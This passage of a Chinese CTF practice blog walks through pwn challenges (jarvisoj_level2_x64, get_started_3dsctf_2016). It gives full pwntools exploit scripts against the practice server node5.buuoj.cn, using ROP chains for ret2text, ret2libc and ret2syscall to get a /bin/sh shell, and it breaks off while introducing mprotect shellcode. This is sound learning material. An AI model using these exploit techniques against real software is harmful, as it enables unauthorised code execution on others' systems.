+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;libc_base: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;system_addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;binsh_addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your choice!&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input your Plaintext to be encrypted&#34;</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里libc版本选择0和3都可以打通，也就是<code>libc6_2.27-0ubuntu2_amd64</code>和<code>libc6_2.27-3ubuntu1_amd64</code>都行</p>
+<h2 id="jarvisoj_level2_x64">jarvisoj_level2_x64
+</h2><p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224122357928.png"
+	width="427"
+	height="111"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224122357928_hu15855351740425461755.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224122357928_hu8851793998187600824.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224122357928"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="384"
+		data-flex-basis="923px"
+	
+></p>
+<p>64位NX保护</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224123232683.png"
+	width="930"
+	height="200"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224123232683_hu9358028712865014767.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224123232683_hu3282140563090334136.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224123232683"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="465"
+		data-flex-basis="1116px"
+	
+></p>
+<p>简单的栈溢出,system和binsh地址都有，直接ret2text</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28020</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x600A90</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x4004C0</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4006b3</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x4004a1</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="get_started_3dsctf_2016">get_started_3dsctf_2016
+</h2><p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224125242758.png"
+	width="455"
+	height="110"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224125242758_hu9151818431975894951.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224125242758_hu17992596301598269213.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224125242758"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="413"
+		data-flex-basis="992px"
+	
+></p>
+<p>32位NX保护，查看main函数，有个gets存在栈溢出</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133143094.png"
+	width="617"
+	height="171"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133143094_hu15662199410284740062.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224133143094_hu4826046726059517191.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224133143094"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="865px"
+	
+></p>
+<p>查看偏移</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133354455.png"
+	width="723"
+	height="224"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133354455_hu16063621560471377113.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224133354455_hu2623168580001465519.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224133354455"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="322"
+		data-flex-basis="774px"
+	
+></p>
+<p>偏移是0x38,这里返回地址显示居然没有+4，网上的文章说是外平栈，之前的题目是内平栈，没怎么懂，也就是少了push ebp;mov ebp esp这个操作</p>
+<p>然后看到get_flag函数</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133720272.png"
+	width="709"
+	height="517"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224133720272_hu8580896985874291618.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224133720272_hu2908566166708581401.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224133720272"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="329px"
+	
+></p>
+<p>这里if判断是可以利用栈溢出来跳过判断，直接走到fopen函数这里拿到flag的，查看一下地址</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224135317661.png"
+	width="1139"
+	height="607"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224135317661_hu7742671523790552767.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224135317661_hu12597452279103153320.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224135317661"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<p>这里我们要跳到0x080489B8,而不是0x080489C0，因为0x080489B8是fopen函数的rt参数负责打开文件并读取</p>
+<p>但是我们直接执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080489B8</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只能本地打通，而远程打不通，这是因为远程环境遇到异常退出就不会回显flag,这里因为fopen函数打开了一个输入流，需要关闭输入流才能回显flag，网上都用的是exit函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29619</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_flag</span> <span class="o">=</span> <span class="mh">0x080489B8</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_addr</span> <span class="o">=</span> <span class="mh">0x0804E6A0</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是远程还是打不通，因为函数最开始是push esi;sub ebp,8的操作，被我们跳过了，当函数正常返回的时候，结尾有个add esp,8;pop esi的操作，这里缺少了push导致esi的位置是错误的，程序就崩溃了，所以还是利用32位函数调用布置栈，<code>函数地址+返回地址+参数1+参数2</code>，满足getflag函数的if判断来getflag吧</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29619</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_flag</span> <span class="o">=</span> <span class="mh">0x080489A0</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_addr</span> <span class="o">=</span> <span class="mh">0x0804E6A0</span>
+</span></span><span class="line"><span class="cl"><span class="n">a1</span> <span class="o">=</span> <span class="mh">0x308CD64F</span>
+</span></span><span class="line"><span class="cl"><span class="n">a2</span> <span class="o">=</span> <span class="mh">0x195719D1</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这题还有两种别的解法</p>
+<p>这题是静态链接的，有一堆函数，所以有丰富的pop和ret指令，可以考虑找找寄存器打ret2syscall,回顾一下ret2syscall需要的寄存器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov eax,0xb
+</span></span><span class="line"><span class="cl">mov ebx,[&#34;/bin/sh&#34;]
+</span></span><span class="line"><span class="cl">mov ecx,0
+</span></span><span class="line"><span class="cl">mov edx,0
+</span></span><span class="line"><span class="cl">int 0x80
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用ROPgadget查找gadget</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224151428948.png"
+	width="789"
+	height="725"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224151428948_hu1697483781344789550.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224151428948_hu13830978152875237364.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224151428948"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="108"
+		data-flex-basis="261px"
+	
+></p>
+<p>这里找到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x080b91e6 : pop eax ; ret
+</span></span><span class="line"><span class="cl">0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224151537004.png"
+	width="662"
+	height="127"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224151537004_hu10627076873142882314.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224151537004_hu8457026826381525936.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224151537004"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="521"
+		data-flex-basis="1251px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0806d7e5 : int 0x80
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是找不到binsh的地址，我们就自己构造，一种思路是写入bss段中，第二种是利用寄存器写入</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224152330128.png"
+	width="1095"
+	height="540"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224152330128_hu12216696719040372676.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224152330128_hu2054338189046945461.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224152330128"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<p>这里有个<code>_tmbuf</code>,可以利用这个来存储我们的binsh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.bss:080ECD60 ??                                _tmbuf db    ? ;                        ; DATA XREF: __tz_convert:loc_8090CC1↑o
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里就要利用两次栈溢出了，第一次栈溢出往bss段写入binsh，第二次栈溢出调用<code>execve('/bin/sh')</code>来getshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29619</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="n">gets_addr</span> <span class="o">=</span> <span class="mh">0x0804F630</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x08048A20</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp_buf</span> <span class="o">=</span> <span class="mh">0x080ECD60</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">tmp_buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">tmp_buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里也可以用read函数，本质是一样的，然后就是另一种ret2syscall,利用寄存器写入binsh,这里要用ROPgadget找mov指令相关的了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary get_started_3dsctf_2016 --only <span class="s2">&#34;mov|ret&#34;</span><span class="p">|</span>grep <span class="s2">&#34;eax&#34;</span>
+</span></span><span class="line"><span class="cl">然后找到一条
+</span></span><span class="line"><span class="cl">0x080557ab : mov dword ptr <span class="o">[</span>edx<span class="o">]</span>, eax <span class="p">;</span> ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样我们就能利用这条gadget替代前面的gets函数了,但是用寄存器不能一次写入<code>/bin/sh</code>，得分成两步，分别写<code>bin</code>和<code>sh</code>,因为这是32位的程序，而/bin/sh是8字节的字符串，所以一共写三次payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29619</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="n">gets_addr</span> <span class="o">=</span> <span class="mh">0x0804F630</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x08048A20</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080b91e6</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">int_80</span> <span class="o">=</span> <span class="mh">0x0806d7e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp_buf</span> <span class="o">=</span> <span class="mh">0x080ECD60</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_edx_eax_ret</span> <span class="o">=</span> <span class="mh">0x080557ab</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在buf的位置写入/bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">tmp_buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在buf+4的位置写入/sh\x00</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">tmp_buf</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_edx_eax_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造execve函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">tmp_buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这道题甚至还可以注入shellcode，尽管有NX保护，程序中有mprotect函数，这个函数用于修改内存区域访问权限的系统调用，用法如下</p>
